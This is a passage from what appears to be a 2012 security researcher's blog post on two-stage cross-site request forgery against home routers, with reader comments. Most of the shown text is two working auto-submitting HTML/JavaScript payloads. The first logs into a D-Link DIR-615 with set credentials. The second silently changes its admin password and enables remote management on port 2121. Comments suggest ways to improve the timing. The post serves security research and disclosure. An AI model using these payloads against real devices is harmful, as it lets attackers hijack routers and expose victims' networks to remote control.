		<div id="crayon-53c9877489288072555050" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form name="loginForm" method="POST" action="http://192.168.0.1/login.htm"&gt;
	&lt;input type="hidden" name="page" value="login" /&gt;
	&lt;input type="hidden" name="submitType" value="0" /&gt;
	&lt;input type="hidden" name="sel_userid" value="admin" /&gt;
	&lt;input type="hidden" name="userid" value="" /&gt;
	&lt;input type="hidden" name="passwd" value="qweasd" /&gt;
	&lt;input type="hidden" name="captchapwd" value="" /&gt;
&lt;/form&gt;
&lt;script type="text/javascript"&gt;
	document.loginForm.submit();
&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877489288072555050-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489288072555050-2">2</div><div class="crayon-num" data-line="crayon-53c9877489288072555050-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489288072555050-4">4</div><div class="crayon-num" data-line="crayon-53c9877489288072555050-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489288072555050-6">6</div><div class="crayon-num" data-line="crayon-53c9877489288072555050-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489288072555050-8">8</div><div class="crayon-num" data-line="crayon-53c9877489288072555050-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489288072555050-10">10</div><div class="crayon-num" data-line="crayon-53c9877489288072555050-11">11</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877489288072555050-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"loginForm"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.0.1/login.htm"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489288072555050-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"page"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"login"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877489288072555050-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"submitType"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489288072555050-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"sel_userid"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"admin"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877489288072555050-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"userid"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489288072555050-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"passwd"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877489288072555050-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"captchapwd"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489288072555050-8"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-e">form</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877489288072555050-9"><span class="crayon-ta">&lt;script </span><span class="crayon-e ">type</span><span class="crayon-o">=</span><span class="crayon-s">"text/javascript"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489288072555050-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-v">loginForm</span><span class="crayon-sy">.</span><span class="crayon-e">submit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877489288072555050-11"><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0077 seconds] -->
<p>Nothing fancy really happens here. We just have to make sure that the user is authenticated for our second stage, which is the CSRF attack which exploits the real weakness in the router:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987748928f573878370" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form name="adminForm" method="POST" action="http://192.168.0.1/tools_admin.htm"&gt;
	&lt;input type="hidden" name="page" value="tools_admin" /&gt;
	&lt;input type="hidden" name="admin_password1" value="qweasd" /&gt;
	&lt;input type="hidden" name="admin_password2" value="qweasd" /&gt;
	&lt;input type="hidden" name="hostname" value="REMOTEENABLED" /&gt;
	&lt;input type="hidden" name="graphical_enable" value="1" /&gt;
	&lt;input type="hidden" name="remote_enable" value="1" /&gt;
	&lt;input type="hidden" name="remote_http_management_port" value="2121" /&gt;
	&lt;input type="hidden" name="remote_inbound_filter" value="11" /&gt;
&lt;/form&gt;

&lt;script type="text/javascript"&gt;
	window.setTimeout(doFormSubmit, 5000);
	function doFormSubmit()
	{
		document.adminForm.submit();
	}
&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987748928f573878370-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987748928f573878370-2">2</div><div class="crayon-num" data-line="crayon-53c987748928f573878370-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987748928f573878370-4">4</div><div class="crayon-num" data-line="crayon-53c987748928f573878370-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987748928f573878370-6">6</div><div class="crayon-num" data-line="crayon-53c987748928f573878370-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987748928f573878370-8">8</div><div class="crayon-num" data-line="crayon-53c987748928f573878370-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987748928f573878370-10">10</div><div class="crayon-num" data-line="crayon-53c987748928f573878370-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987748928f573878370-12">12</div><div class="crayon-num" data-line="crayon-53c987748928f573878370-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987748928f573878370-14">14</div><div class="crayon-num" data-line="crayon-53c987748928f573878370-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987748928f573878370-16">16</div><div class="crayon-num" data-line="crayon-53c987748928f573878370-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987748928f573878370-18">18</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987748928f573878370-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"adminForm"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.0.1/tools_admin.htm"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987748928f573878370-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"page"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"tools_admin"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987748928f573878370-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"admin_password1"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987748928f573878370-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"admin_password2"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987748928f573878370-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"hostname"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"REMOTEENABLED"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987748928f573878370-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"graphical_enable"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"1"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987748928f573878370-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_enable"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"1"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987748928f573878370-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_http_management_port"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"2121"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987748928f573878370-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_inbound_filter"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"11"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987748928f573878370-10"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-e">form</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987748928f573878370-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987748928f573878370-12"><span class="crayon-ta">&lt;script </span><span class="crayon-e ">type</span><span class="crayon-o">=</span><span class="crayon-s">"text/javascript"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987748928f573878370-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-e">setTimeout</span><span class="crayon-sy">(</span><span class="crayon-i">doFormSubmit</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987748928f573878370-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">doFormSubmit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c987748928f573878370-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987748928f573878370-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-v">adminForm</span><span class="crayon-sy">.</span><span class="crayon-e">submit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987748928f573878370-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987748928f573878370-18"><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0068 seconds] -->
<p>The key here is that while the first login iFrame is loaded straight away, we have to wait to make sure that the request happened. This could be anything from 5ms to a second. In this case, we wait 5000ms to be safe. This could likely be lowered a lot.</p>
<p>This was validated against the EU version of the D-Link DIR-615 with 8.0A firmware. And while it probably could be optimized quite a bit and made a lot prettier/subtle, it addresses something which I couldn&#8217;t find a solution to easily on Google/WAHHv2. This could potentially be a lot simpler against a target that accepts a GET requests to do the same. But this will work for both by simply changing the method in the form.</p>
					</div><!-- .entry-content -->

	<footer class="entry-meta">
				This entry was tagged <a href="https://charlieeriksen.github.io/tag/csrf/" rel="tag">CSRF</a>. Bookmark the <a href="https://charlieeriksen.github.io/2012/09/29/two-stage-csrf-attacks/" title="Permalink to Two-stage CSRF attacks" rel="bookmark">permalink</a>.
					</footer><!-- .entry-meta -->
</article><!-- #post-142 -->

					<nav id="nav-below">
		<h2 class="assistive-text">Post navigation</h2>

		
					<div class="nav-previous"><a href="https://charlieeriksen.github.io/2012/08/20/wordpress-zingiri-shop-sql-injection-vulnerabilities/" rel="prev"><span class="meta-nav">&larr;</span> WordPress Zingiri Shop SQL injection vulnerabilities</a></div>			<div class="nav-next"><a href="https://charlieeriksen.github.io/2012/10/01/proxmox-ve-information-disclosure/" rel="next">Proxmox VE information disclosure <span class="meta-nav">&rarr;</span></a></div>						
	
	</nav><!-- #nav-below -->
	
						<div id="comments">
	
	
			<h2 id="comments-title">
			6 comments		</h2>

		
		<ol class="commentlist">
				<li class="comment even thread-even depth-1" id="li-comment-36">
		<article id="comment-36" class="comment">
			<footer class="comment-meta">
				<div class="comment-author vcard">
					<img alt='' src='http://1.gravatar.com/avatar/9fd23452a1c9484402a6029156d87642?s=68&amp;d=http%3A%2F%2F1.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D68&amp;r=G' class='avatar avatar-68 photo' height='68' width='68' /><span class="fn"><a href='http://itsec.skora.net' rel='external nofollow' class='url'>Thomas Skora</a></span> <a href="https://charlieeriksen.github.io/2012/09/29/two-stage-csrf-attacks/#comment-36"><time pubdate datetime="2012-09-30T08:46:02+00:00">September 30, 2012 at 8:46 am</time></a>
									</div><!-- .comment-author .vcard -->

				
			</footer>

			<div class="comment-content"><p>One suggestion: use onload event handler of iframe instead of waiting a static amount of time. I use this technique in my clickjacking exploits.</p>
</div>

			<div class="reply">
				<a rel="nofollow" class="comment-reply-login" href="https://charlieeriksen.github.io/wp-login.php?redirect_to=http%3A%2F%2Fceriksen.com%2F2012%2F09%2F29%2Ftwo-stage-csrf-attacks%2F">Log in to Reply</a>			</div><!-- .reply -->
		</article><!-- #comment-## -->

	</li><!-- #comment-## -->
	<li class="comment odd alt thread-odd thread-alt depth-1" id="li-comment-37">
		<article id="comment-37" class="comment">
			<footer class="comment-meta">
				<div class="comment-author vcard">
					<img alt='' src='http://1.gravatar.com/avatar/5076de19657778b0494da2e8f9b8d8a9?s=68&amp;d=http%3A%2F%2F1.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D68&amp;r=G' class='avatar avatar-68 photo' height='68' width='68' /><span class="fn"><a href='http://h43z.blogspot.com' rel='external nofollow' class='url'>h43z</a></span> <a href="https://charlieeriksen.github.io/2012/09/29/two-stage-csrf-attacks/#comment-37"><time pubdate datetime="2012-09-30T17:21:24+00:00">September 30, 2012 at 5:21 pm</time></a>
									</div><!-- .comment-author .vcard -->

				
			</footer>

			<div class="comment-content"><p>hey. played with this, too. Maybe you wanna check it out.<br />
<a href="http://h43z.blogspot.de/2012/08/bruteforce-router-with-js.html" rel="nofollow">http://h43z.blogspot.de/2012/08/bruteforce-router-with-js.html</a></p>
</div>

			<div class="reply">
				<a rel="nofollow" class="comment-reply-login" href="https://charlieeriksen.github.io/wp-login.php?redirect_to=http%3A%2F%2Fceriksen.com%2F2012%2F09%2F29%2Ftwo-stage-csrf-attacks%2F">Log in to Reply</a>			</div><!-- .reply -->
		</article><!-- #comment-## -->

	</li><!-- #comment-## -->
	<li class="comment even thread-even depth-1" id="li-comment-42">
		<article id="comment-42" class="comment">
			<footer class="comment-meta">
				<div class="comment-author vcard">
					<img alt='' src='http://0.gravatar.com/avatar/88039f49b6f3970a915dac44e75d8446?s=68&amp;d=http%3A%2F%2F0.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D68&amp;r=G' class='avatar avatar-68 photo' height='68' width='68' /><span class="fn">steve</span> <a href="https://charlieeriksen.github.io/2012/09/29/two-stage-csrf-attacks/#comment-42"><time pubdate datetime="2012-10-02T02:48:52+00:00">October 2, 2012 at 2:48 am</time></a>
									</div><!-- .comment-author .vcard -->

				
			</footer>

			<div class="comment-content"><p>Nice solution! However, my router uses basic http auth, and you need to send a GET  to login. Any ideas on how to bypass the origin policy and set the Authorization header for a GET?</p>
</div>

			<div class="reply">
				<a rel="nofollow" class="comment-reply-login" href="https://charlieeriksen.github.io/wp-login.php?redirect_to=http%3A%2F%2Fceriksen.com%2F2012%2F09%2F29%2Ftwo-stage-csrf-attacks%2F">Log in to Reply</a>			</div><!-- .reply -->
		</article><!-- #comment-## -->

	<ul class="children">
	<li class="comment odd alt depth-2" id="li-comment-45">
		<article id="comment-45" class="comment">
			<footer class="comment-meta">
				<div class="comment-author vcard">
					<img alt='' src='http://1.gravatar.com/avatar/5dcdf28d944831f2fb87d48b81500c66?s=68&amp;d=http%3A%2F%2F1.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D68&amp;r=G' class='avatar avatar-68 photo' height='68' width='68' /><span class="fn"><a href='http://beefproject.com' rel='external nofollow' class='url'>Bmantra</a></span> <a href="https://charlieeriksen.github.io/2012/09/29/two-stage-csrf-attacks/#comment-45"><time pubdate datetime="2012-10-04T09:35:51+00:00">October 4, 2012 at 9:35 am</time></a>
									</div><!-- .comment-author .vcard -->

				
			</footer>

			<div class="comment-content"></div>

			<div class="reply">
				<a rel="nofollow" class="comment-reply-login" href="https://charlieeriksen.github.io/wp-login.php?redirect_to=http%3A%2F%2Fceriksen.com%2F2012%2F09%2F29%2Ftwo-stage-csrf-attacks%2F">Log in to Reply</a>			</div><!-- .reply -->
		</article><!-- #comment-## -->

	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
	<li class="comment byuser comment-author-admin bypostauthor even thread-odd thread-alt depth-1" id="li-comment-43">
		<article id="comment-43" class="comment">
			<footer class="comment-meta">
				<div class="comment-author vcard">
					<img alt='' src='http://0.gravatar.com/avatar/a3dde00553bd6bb363140bcd39d1d07d?s=68&amp;d=http%3A%2F%2F0.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D68&amp;r=G' class='avatar avatar-68 photo' height='68' width='68' /><span class="fn">Charlie Eriksen</span> <a href="https://charlieeriksen.github.io/2012/09/29/two-stage-csrf-attacks/#comment-43"><time pubdate datetime="2012-10-02T02:54:05+00:00">October 2, 2012 at 2:54 am</time></a>
									</div><!-- .comment-author .vcard -->

				
			</footer>

			<div class="comment-content"><p>I don&#8217;t think you can bypass the origin policy nor set an authorization header from a normal browser. And I think Flash respects same original policy as well, just as well as java applets. So I don&#8217;t think you have many option :/</p>
</div>

			<div class="reply">
				<a rel="nofollow" class="comment-reply-login" href="https://charlieeriksen.github.io/wp-login.php?redirect_to=http%3A%2F%2Fceriksen.com%2F2012%2F09%2F29%2Ftwo-stage-csrf-attacks%2F">Log in to Reply</a>			</div><!-- .reply -->
		</article><!-- #comment-## -->

	</li><!-- #comment-## -->
		</ol>

		
	
									<div id="respond" class="comment-respond">
				<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2012/09/29/two-stage-csrf-attacks/#respond" style="display:none;">Cancel reply</a></small></h3>
									<p class="must-log-in">You must be <a href="https://charlieeriksen.github.io/wp-login.php?redirect_to=http%3A%2F%2Fceriksen.com%2F2012%2F09%2F29%2Ftwo-stage-csrf-attacks%2F">logged in</a> to post a comment.</p>												</div><!-- #respond -->
			
</div><!-- #comments -->

			
			</div><!-- #content -->
		</div><!-- #primary -->

			<div id="secondary" class="widget-area" role="complementary">
			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
SA51348<br />
SA51344<br />
SA51336 </p>
</div>
		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-3"><a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (34)
</li>
	<li class="cat-item cat-item-12"><a href="https://charlieeriksen.github.io/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
</li>
	<li class="cat-item cat-item-30"><a href="https://charlieeriksen.github.io/category/security/" title="View all posts filed under Security">Security</a> (7)
</li>
		</ul>
</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
						</li>
					<li>
